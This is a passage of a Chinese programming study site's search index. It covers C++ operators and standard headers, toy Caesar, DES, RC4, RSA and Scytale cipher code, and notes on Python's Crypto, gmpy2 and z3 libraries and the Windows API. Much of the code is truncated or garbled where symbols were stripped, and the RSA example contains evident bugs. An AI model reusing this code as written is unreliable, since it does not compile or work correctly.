的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 + 把两个操作数相加 A + B 将得到 30 - 从第一个操作数中减去第二个操作数 A - B 将得到 -10 * 把两个操作数相乘 A * B 将得到 200 / 分子除以分母 B / A 将得到 2 % 取模运算符，整除后的余数 B % A 将得到 0 ++ 自增运算符，整数值增加 1 A++ 将得到 11 -- 自减运算符，整数值减少 1 A-- 将得到 9 关系运算符 下表显示了 C++ 支持的关系运算符。 假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 不为真。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 > 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A > B) 不为真。 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A >= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A >= B) 不为真。 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A 逻辑运算符 下表显示了 C++ 支持的关系逻辑运算符。 假设变量 A 的值为 1，变量 B 的值为 0，则： 运算符 描述 实例 && 称为逻辑与运算符。如果两个操作数都 true，则条件为 true。 (A && B) 为 false。 \\ 称为逻辑或运算符。如果两个操作数中有任意一个 true，则条件为 true。 (A \\ B) 为 true。 ! 称为逻辑非运算符。用来逆转操作数的逻辑状态，如果条件为 true 则逻辑非运算符将使其为 false。 !(A && B) 为 true。 位运算符 位运算符作用于位，并逐位执行操作。&、 | 和 ^ 的真值表如下所示： p q p & q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 &：按位与操作 |：按位或操作 ^：按位异或 赋值运算符 下表列出了 C++ 支持的赋值运算符： 运算符 描述 实例 = 简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C += 加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -= 减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *= 乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C = A 相当于 C = C A /= 除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %= 求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A 左移且赋值运算符 C >>= 右移且赋值运算符 C >>= 2 等同于 C = C >> 2 &= 按位与且赋值运算符 C &= 2 等同于 C = C & 2 ^= 按位异或且赋值运算符 C ^= 2 等同于 C = C ^ 2 \\ = 按位或且赋值运算符 C \\ = 2 等同于 C = C \\ 2 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/Caesar算法实现.html":{"url":"4.编程语言/C++/Caesar算法实现.html","title":"Caesar算法实现","keywords":"","body":"#include #include #define MAX 255 void encode(char str[], int n){ int i, j, k; char min[26]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}; char max[26]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}; for (i = 0; i = 'a' && str[i] = 'A' && str[i] = 'a' && str[i] = 'A' && str[i] 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/cmath.html":{"url":"4.编程语言/C++/cmath.html","title":"Cmath","keywords":"","body":"在 C++ 中，除了可以创建各种函数，还包含了各种有用的函数供您使用。这些函数写在标准 C 和 C++ 库中，叫做内置函数。您可以在程序中引用这些函数。 C++ 内置了丰富的数学函数，可对各种数字进行运算。下表列出了 C++ 中一些有用的内置的数学函数。 为了利用这些函数，您需要引用数学头文件。 序号 函数 描述 1 double cos(double); 该函数返回弧度角（double 型）的余弦。 2 double sin(double); 该函数返回弧度角（double 型）的正弦。 3 double tan(double); 该函数返回弧度角（double 型）的正切。 4 double log(double); 该函数返回参数的自然对数。 5 double pow(double, double); 假设第一个参数为 x，第二个参数为 y，则该函数返回 x 的 y 次方。 6 double hypot(double, double); 该函数返回两个参数的平方总和的平方根，也就是说，参数为一个直角三角形的两个直角边，函数会返回斜边的长度。 7 double sqrt(double); 该函数返回参数的平方根。 8 int abs(int); 该函数返回整数的绝对值。 9 double fabs(double); 该函数返回任意一个浮点数的绝对值。 10 double floor(double); 该函数返回一个小于或等于传入参数的最大整数。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/cstdlib-stdlib.h.html":{"url":"4.编程语言/C++/cstdlib-stdlib.h.html","title":"cstdlib-stdlib.h","keywords":"","body":"此头文件定义了几个通用功能，包括： 动态内存管理 随机数生成 与环境的通信 整数算术 搜索、排序 转换 字符串转换函数 函数 描述 atof 转换 string -> double atoi 转换 string -> int atol 转换 string -> long int atoll (C++11) 转换 string -> long long int 下述函数是上述函数的稳定代替 strtod 转换 string -> double strtof (C++11) 转换 string -> float strtol 转换 string -> long int strtoul 转换 string -> unsigned long int strtoll (C++11) 转换 string -> long long int strtoull (C++11) 转换 string -> unsigned long long int 伪随机序列生成 函数 描述 srand 初始化随机数生成器 rand 生成随机数 动态内存管理 函数 描述 calloc 分配和零初始化数组 free 解除已分配内存块 malloc 分配内存块 realloc 重新分配内存块 搜索和排序 函数 描述 bsearch 对数组进行二进制搜索 qsort 采用快速排序对数组元素进行排序 数学函数 函数 描述 abs 计算整数的绝对值 labs 计算长整数的绝对值 div 除以整数得出商，返回余数结果 ldiv 除以长整数整数得出商，返回余数结果 多字节字符和字符串 函数 描述 mblen 返回多字节符的长度大小 mbtowc 将多字节字符转换为宽字符 wctomb 将宽字符转换为多字节字符 mbstowcs 将多字节字符串序列转换为宽字符序列 wcstombs 将宽字符序列转换为多字节字符串序列 程序进程控制 函数 描述 abort 中止当前进程 atexit 设置退出时执行的函数 exit 终止呼叫进程 getenv 获取环境字符串 system 执行系统命令 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/cstring-string.h.html":{"url":"4.编程语言/C++/cstring-string.h.html","title":"cstring-string.h","keywords":"","body":" 字符数组复制 函数 用法 描述 strcpy strncpy ( str2, str1 ); 复制str1字符串到str2 strncpy strncpy ( str2, str1, 5 ); 可以指定复制多少个字符，复制str1字符串的前5个字符到str2 字符数组连接 函数 用法 描述 strcat strcat ( str2, str1 ); 连接str1字符串到str2末尾 strncat strncat ( str2, str1, 5 ); 可以指定连接多少个字符，将str1字符串的前5个字符连接到str2末尾 字符数组比较 strcmp比较函数，返回的是bool值。 函数 用法 描述 strcmp strcmp ( str1, str2 ); 比较str1和str2 /img/image-20240303170258315.png) 字符数组查找 函数 用法 描述 strchr strchr(str,str1); 连接str1字符串到str2末尾 strstr strstr(str,str1); 可以指定连接多少个字符，将str1字符串的前5个字符连接到str2末尾 strchr函数可以在一个字符数组里找某个字符第一次出现的位置，返回的是字符元素下标； strstr函数可以在一个字符数组里查找另一个字符数组第一次出现的位置，返回的是字符串元素下标； 改变连续一段字符的值 memset是一个非常好用的函数，不仅在字符串方面。它可以把连续一段区间的内存修改成同一个值，以字节为单位。 而一个字符正好就是一个字节，这也就让memset可以很好的为字符串的区间修改提供服务。 函数 用法 描述 memset memset(ptr, value, num); ptr指向要修改的内存块的起始地址，value是要修改成什么值，num是修改多少个。 例子： int main () { char str[] = \"almost every programmer should know memset!\"; memset (str, '-', 6); puts (str); return 0; } /* ------ every programmer should know memset! */ 字符数组长度 strlen用于求一个字符数组的长度，注意它是从给定的起始位置开始不断往后尝试，直到遇到’\\0’为止的，因此它的时间复杂度并不是常数级别的，而是取决于字符数组的长度，在字符数组没有变动的情况下请务必不要重复调用。 函数 用法 描述 strlen strlen(str); 返回str字符串的长度 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/ctime-time.h.html":{"url":"4.编程语言/C++/ctime-time.h.html","title":"ctime-time.h","keywords":"","body":"时间的数据类型 （1）struct tm 自1900年至今经过的时间： Member Type Meaning Range tm_sec int seconds after the minute 0-60* tm_min int minutes after the hour 0-59 tm_hour int hours since midnight 0-23 tm_mday int day of the month 1-31 tm_mon int months since January 0-11 tm_year int years since 1900 tm_wday int days since Sunday 0-6 tm_yday int days since January 1 0-365 tm_isdst int Daylight Saving Time flag （2）clock_t 表示时钟的滴答，可以用ticks 表示。实际是long类型。 1秒的clicks为CLOCKS_PER_SEC个ticks，定义为1000个。 （3）time_t 从1900年1月1日0点UTC时间开始的时间， 实际是一个long类型。单位秒。 （4）size_t size_t类型很多地方都可以使用，实际上是一个unsigned int类型。 2. 时间转换函数 5个时间转换函数功能如下： 函数 说明 asctime tm 转 string ctime time_t 转 string gmtime UTC时间的time_t 转 tm localtime 本地时间的time_t 转 tm strftime 格式化为string mktime tm 转time_t 3. 时间操作的函数 有4种处理时间的函数： 函数 描述 time() 获取当地时间，返回time_t类型。返回的时间为UTC格林尼治时间1970年1月1日00:00:00到当前时刻的时长，时长单位是秒。 clock() 获取时钟的clicks，返回clock_t类型。 difftime() 获取时间差的函数，返回double类型。其实可以直接做减法 #include #include int main () { time_t timer; time(&timer); //或者timer = time(NULL),两种方式获取当地时间 std::cout #include #include /* clock_t, clock, CLOCKS_PER_SEC */ int main () { clock_t t; int f; t = clock();//获取现在的clicks for (int i=0; i #include #include /* time_t, struct tm, difftime, time, mktime */ #include int main () { time_t t1; time_t t2; struct tm tm1, tm2; double seconds; time(&t1);//获取现在的时间 for (int i=0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/DES算法实现.html":{"url":"4.编程语言/C++/DES算法实现.html","title":"DES算法实现","keywords":"","body":"#include #include #include /*========================初始置换表IP=========================*/ int IP_Table[64] = { 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7, 56, 48, 40, 32, 24, 16, 8, 0, 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6}; /*========================逆初始置换表IP^-1====================*/ int IP_1_Table[64] = { 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25, 32, 0, 40, 8, 48, 16, 56, 24}; /*========================扩展变换表E盒========================*/ int E_Table[48] = { 31, 0, 1, 2, 3, 4, 3, 4, 5, 6, 7, 8, 7, 8, 9, 10, 11, 12, 11, 12, 13, 14, 15, 16, 15, 16, 17, 18, 19, 20, 19, 20, 21, 22, 23, 24, 23, 24, 25, 26, 27, 28, 27, 28, 29, 30, 31, 0}; /*===========================S盒==============================*/ int S_Box[8][4][16] = { // S1 { {14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7}, {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8}, {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0}, {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}}, // S2 { {15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10}, {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5}, {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15}, {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}}, // S3 { {10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8}, {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1}, {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7}, {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}}, // S4 { {7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15}, {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9}, {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4}, {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}}, // S5 { {2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9}, {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6}, {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14}, {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}}, // S6 { {12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11}, {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8}, {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6}, {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}}, // S7 { {4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1}, {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6}, {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2}, {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}}, // S8 { {13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7}, {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2}, {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8}, {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}}}; /*========================置换函数P盒==========================*/ int P_Box[32] = { 15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, 23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 21, 10, 3, 24}; /*========================置换选择器1==========================*/ int PC_1_table[56] = {56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, 44, 36, 28, 20, 12, 4, 27, 19, 11, 3}; /*========================置换选择器2==========================*/ int PC_2_table[48] = {13, 16, 10, 23, 0, 4, 2, 27, 14, 5, 20, 9, 22, 18, 11, 3, 25, 7, 15, 6, 26, 19, 12, 1, 40, 51, 30, 36, 46, 54, 29, 39, 50, 44, 32, 46, 43, 48, 38, 55, 33, 52, 45, 41, 49, 35, 28, 31}; /*========================对左移次数的规定====================*/ int MOVE_table[16] = {1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1}; void CharToBit(char *input,int *output,int bits);//将字符数组转换成二进制数组 void BitToChar(int *input, char *output, int bits);//将二进制数组转换成字符数组 void Xor(int InA[],int InB[],int len);//异或操作 void IP_IPR(int input[64],int output[64],int table[64]);//IP初始置换和逆置换函数,由table决定是逆置换还是初始置换 void E(int input[32],int output[48],int table[48]);//E盒扩展 void P(int input[32],int output[32],int table[32]);//P盒替代 void PC_1(int input[64],int output[56],int table[56]);//PC-1置换选择器 void PC_2(int input[56],int output[48],int table[48]);//PC-2置换选择器 void S(int input[48],int output[32],int table[8][4][16]);//S盒压缩 void F_func(int input[32],int subkey[48]);//F轮函数 void BitsCopy(int *DatOut,int *DatIn,int Len);//把DatIn开始的长度位Len位的二进制复制到DatOut后 void RotateL(int input[28],int output[28], int move);//子秘钥中循环左移函数 void subKey_fun(int input[64],int Subkey[16][48]);//子秘钥生成 void BitToHex(char *DatOut,int *DatIn,int Num);//二进制密文转换为十六进制需要16个字符表示 void DES_Dfun(int input[],char key_in[],char output[]);//DES加密 void ShowArray(int *array,int num);//输出字符数组 int main(){ int i = 0; char key[9] = {0}; char message[9] = {0}; int keybin[64] = {0}, mesbin[64] = {0}; char cipher[9]; printf(\"输入8字节的明文：\"); //fgets(message, sizeof(message), stdin); scanf(\"%s\", message); printf(\"输入8字节的秘钥：\"); //fgets(key, sizeof(key), stdin); scanf(\"%s\", key); while(strlen(key) != 8) { printf(\"请输入正确的密钥：\"); //fgets(key, sizeof(key), stdin); scanf(\"%s\", key); i = 0; while(key[i] != '\\0') { i++; } } CharToBit(message, mesbin, 64); DES_Dfun(mesbin, key, cipher); printf(\"\\n------------加密后数据------------\\n\"); for(i = 0; i > (i % 8)) & 1; } } void BitToChar(int *input, char *output, int bits) { for(int i = 0; i 9) { dataout[i] = dataout[i] % 16 + '7'; // 余数大于9时处理 10-15 to A-F }else{ dataout[i] = dataout[i] % 16 + '0'; } } } void ShowArray(int * array, int num) { int i; for(i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/RC4算法实现.html":{"url":"4.编程语言/C++/RC4算法实现.html","title":"RC4算法实现","keywords":"","body":"#include void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) //鍒濆鍖栧嚱鏁� { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/RSA算法实现.html":{"url":"4.编程语言/C++/RSA算法实现.html","title":"RSA算法实现","keywords":"","body":"#include int fun(int x, int y){ int t; // while(y){ // t = x; // x = y; // y = t % y; // } for (t = x; y != 0; y = t % y){ x = y; } if (x = 1){return 0;} else {return 1;} } int canpd(int m, int b, int n){ int r = 1; for (b = b + 1; b != 1; b--){ r = r * m; r = r % n; } //printf(\"r = %d\\n\", r); return r; } int main(){ int p, q, e, d, m, n, r, c, t; printf(\"请输入两个素数p、q：\"); scanf(\"%d %d\", &p, &q); n = p * q; printf(\"n = %d\\n\", n); t = (p - 1) * (q - 1); printf(\"t = %d\\n\", t); printf(\"请输入公钥e：\"); scanf(\"%d\", &e); if (e t || fun(e, t)){ printf(\"公钥输入有误，请重新输入e = \"); scanf(\"%d\", e); } d = 1; while(((e * d) % t) != 1){d++;} printf(\"私钥d = %d\\n\", d); printf(\"1.加密\\n\"); printf(\"2.解密\\n\"); printf(\"3.退出\\n\"); while(1){ printf(\"请输入你要执行的操作：\"); scanf(\"%d\", &r); switch(r){ case 1: printf(\"请输入明文：\"); scanf(\"%d\", &m); c = canpd(m, e, n); printf(\"加密后的数据c = %d\\n\", c); break; case 2: printf(\"请输入密文：\"); scanf(\"%d\", &c); m = canpd(c, d, n); printf(\"解密后的数据m = %d\\n\", m); break; case 3:return 0; default: printf(\"输入的操作数有误，请重新输入!!!\\n\"); break; } } return 0; } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/Saytale算法实现.html":{"url":"4.编程语言/C++/Saytale算法实现.html","title":"Saytale算法实现","keywords":"","body":"#include #include void *encode(char p[], char cipher[], int key[]){ int j; for (int i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/剖析cout.html":{"url":"4.编程语言/C++/剖析cout.html","title":"剖析cout","keywords":"","body":"什么是cout cout是一个对象 它的作用是把通过输入它的消息显示在屏幕上（具体怎么实现可以暂时不用了解。这就是对象的好处之一，你可以不需要理解它的内部工作原理，只要知道怎么用就行）， cout这句语句的含义就是把字符串\"aa\"插入到输出流中去，插入之后对象cout会自动想办法把插入的流显示到屏幕上。 什么是 你可能会疑问为什么左移运算符可以表示插入 这里是使用了运算符重载， 具体什么是重载运算符这里不需要理解 什么是endl; endl是一个特殊的C++符号 endl表示重启一行 endl也被定义在iostream中,位于命名空间std中 endl和’\\n’的关系 两者都可以表示换行 endl确保程序继续运行前刷新输出，'\\n'不能提供这样的保证，意味着在有些系统中,有时可能在你输入信息后才显示 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/python/Crypto算法库详解.html":{"url":"4.编程语言/python/Crypto算法库详解.html","title":"Crypto算法库详解","keywords":"","body":"一、概述 常见对称密码在 Crypto.Cipher 库下，主要有：DES、3DES、AES、RC4、Salsa20 非对称密码在 Crypto.PublicKey 库下，主要有：RSA、ECC、DSA 哈希密码在 Crypto.Hash 库下，常用的有：MD5、SHA-1、SHA-128、SHA-256 随机数在 Crypto.Random 库下 实用小工具在 Crypto.Util 库下 数字签名在 Crypto.Signature 库下 二、详解 1、Crypto.Cipher 示例 from Crypto.Cipher import AES import base64 key = bytes('this_is_a_key'.ljust(16,' '),encoding='utf8') aes = AES.new(key,AES.MODE_ECB) # encrypt plain_text = bytes('this_is_a_plain'.ljust(16,' '),encoding='utf8') text_enc = aes.encrypt(plain_text) text_enc_b64 = base64.b64encode(text_enc) print(text_enc_b64.decode(encoding='utf8')) # decrypt msg_enc = base64.b64decode(text_enc_b64) msg = aes.decrypt(msg_enc) print(msg.decode(encoding='utf8')) 2、Crypto.PublicKey 3、Crypto.Hash 4、Crypto.Random 5、Crypto.Util 6、Crypto.Signature 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"4.编程语言/python/gmpy2库的使用.html":{"url":"4.编程语言/python/gmpy2库的使用.html","title":"gmpy2库的使用","keywords":"","body":"gmpy2库的使用 初始化一个高精度的数据类型 a=gmpy2.mpz(x) #可以为变量a赋予一个高精度的大整数（长度可达50位） a=gmpy2.mpq(x) #可以为变量a初始化一个高精度的分数 a=gmpy2.mpfr(x) #可以为a初始化一个高精度的浮点数 a=gmpy2.mpc(x) #可以为a初始化一个高精度的复数 其它的常用语法 gmpy2.powmod(a, n, p) # 模幂运算,对于给定的整数p,n,a,计算aⁿ mod p gmpy2.iroot(x, n) # 对x开n次方根 gmpy2.gcd(a, b) # 欧几里得算法,求得a，b的最大公约数 gmpy2.lcm(a, b) # 欧几里得算法,求得最小公倍数 gmpy2.gcdext(e1, e2) # 扩展欧几里得,求式子e1*x+e2*y=gcd(e1,e2)。在RSA加密算法中利用该公式来求e的逆元d，由于实际上公钥e的选取需要保证gcd（e，ψ(n)）=1，所以在这种情况下式子的右边就是1，且通常用下面这个公式来求逆元。 gmpy2.invert(a, c) # 模逆运算,对a，求b，使得a*b=1（mod c） gmpy2.is_prime() # 素数检测 gmpy2.is_even() # 奇数检测 gmpy2.is_odd() # 偶数检测 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/python/z3库（z3_solver）使用.html":{"url":"4.编程语言/python/z3库（z3_solver）使用.html","title":"z3库（z3_solver）使用","keywords":"","body":"z3库（z3_solver）使用 简介 Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域中，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。 库内函数： 1.创建一个解的声明对象： s = Solver() 2.添加条件： s.add(判断公式) 3.判断是否有解： s.check() # 如果有解,则反回sate/sat 反之 返回 unsate/unsat 4.返回最后的解： result=s.modul() print(result) 5.声明不同类型的未知数： a, s, d = Ints('a s d')#创建一个‘int’类型的对象，但其实运算时候是'ArithRef'类型，并且无法使用按位运算 x = Real('x') #创建一个有理数类型的变量。 y = Real('y') z3库最牛逼的来了:上面两个就是比正常多元未知数复杂了点，求解按位运算才是这个库最吊的！ BitVecs(name,bv,ctx=None) # 创建一个有多变量的位向量，name是名字，bv表示大小 # a,b,c=s=BitVecs('a b c',32) Bitvex(name,bv,ctx=None) # 创建一个位向量，name是他的名字，bv表示大小 BitVecSort(bv,ctx=None) # 创建一个指定大小的位向量 BitVecVal(val,bv,ctx=None) # 创建一个位向量，有初始值，没名字 整型(Int)方程求解 from z3 import * a, s, d = Ints('a s d') x = Solver() x.add(a-d == 18) x.add(a+s == 12) x.add(s-d == 20) check = x.check() print(check) model = x.model() print(model) # sat # [a = 5, d = -13, s = 7] 有理数(Real)型解方程求解 from z3 import * x = Real('x') y = Real('y') s = Solver() s.add(x**2 + y**2 == 3) s.add(x**3 == 2) check = s.check() print(check) model = s.model() print(model) # sat # [y = -1.1885280594?, x = 1.2599210498?] 位向量(BitVec)型解方程 from z3 import * x, y, z = BitVecs('x y z', 8) s = Solver() s.add(x ^ y & z == 12) s.add(y & z >> 3 == 3) s.add(z ^ y == 4) check = s.check() print(check) model = s.model() print(model) # sat # [z = 27, y = 31, x = 23] 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/python/通过公钥文件获取n，e.html":{"url":"4.编程语言/python/通过公钥文件获取n，e.html","title":"通过公钥文件获取n，e","keywords":"","body":"通过公钥文件获取n，e from Crypto.PublicKey import RSA with open(\"./key.pub\", \"rb\") as file: key = file.read() print(key) pub = RSA.importKey(key) n = pub.n e = pub.e print(\"n = \", n) print(\"e = \", e) 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"4.编程语言/Windows_API/":{"url":"4.编程语言/Windows_API/","title":"Windows API","keywords":"","body":"目录 1、Windows_API函数分类 2、文件处理函数 3、网络函数 4、消息函数 5、打印函数 6、文本和字体函数 7、菜单函数 8、位图、图标和光栅运算函数 9、绘图函数 10、设备场景函数 11、硬件与系统函数 12、 进程和线程函数 13、控件与消息函数 Windows API包括几千个可调用的函数，它们大致可以分为以下几个大类：基本服务、组件服务、用户界面服务、图形多媒体服务、消息和协作、网络、Web服务。 Windows API所提供的七类功能详细介绍： 基础服务（Base Services）： 提供对Windows系统可用的基础资源的访问接口。比如象：文件系统（file system）、外部设备（device）、，进程（process）、线程（thread）以及访问注册表（Windows registry）和错误处理机制（error handling）。这些功能接口位于，16位Windows下的kernel.exe、krnl286.exe或krnl386.exe系统文档中；以及32位Windows下的 kernel32.dll和advapi32.dll中。 图形设备接口（GDI）： 提供功能为：输出图形内容到显示器、打印机以及其他外部输出设备。它位于16位Windows下的gdi.exe；以及32位Windows下的gdi32.dll。 图形化用户界面（GUI）： 提供的功能有创建和管理屏幕和大多数基本控件（control），比如按钮和滚动条。接收鼠标和键盘输入，以及其他与GUI有关的功能。这些调用接口位于：16位Windows下的user.exe，以及32位Windows下的user32.dll。从Windows XP版本之后，基本控件和通用对话框控件（Common Control Library）的调用接口放在comctl32.dll中。 通用对话框链接库（Common Dialog Box Library）： 为应用程序提供标准对话框，比如打开/保存文档对话框、颜色对话框和字体对话框等等。这个链接库位于：16位Windows下的commdlg.dll中，以及32位Windows下comdlg32.dll中。它被归类为User Interface API之下。 通用控件链接库（Common Control Library）：为应用程序提供接口来访问操作系统提供的一些高级控件。比如像：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar）和标签（tab）。这个链接库位于：16位Windows下的commctrl.dll中，以及32位Windows下comctl32.dll中。。它被归类为User Interface API之下。 Windows外壳（Windows Shell）：作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。它位于16位Windows下的shell.dll中，以及32位Windows下的shell32.dll中（Windows 95则在 shlwapi.dll中）。 它被归类为User Interface API之下。 网络服务（Network Services）：为访问操作系统提供的多种网络 功能提供接口。它包括NetBIOS、Winsock、NetDDE及RPC等。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/1、Windows_API函数分类.html":{"url":"4.编程语言/Windows_API/1、Windows_API函数分类.html","title":"1、Windows_API函数分类","keywords":"","body":"Windows API包括几千个可调用的函数，它们大致可以分为以下几个大类：基本服务、组件服务、用户界面服务、图形多媒体服务、消息和协作、网络、Web服务。 Windows API所提供的七类功能详细介绍： 基础服务（Base Services）： 提供对Windows系统可用的基础资源的访问接口。比如象：文件系统（file system）、外部设备（device）、，进程（process）、线程（thread）以及访问注册表（Windows registry）和错误处理机制（error handling）。这些功能接口位于，16位Windows下的kernel.exe、krnl286.exe或krnl386.exe系统文档中；以及32位Windows下的 kernel32.dll和advapi32.dll中。 图形设备接口（GDI）： 提供功能为：输出图形内容到显示器、打印机以及其他外部输出设备。它位于16位Windows下的gdi.exe；以及32位Windows下的gdi32.dll。 图形化用户界面（GUI）： 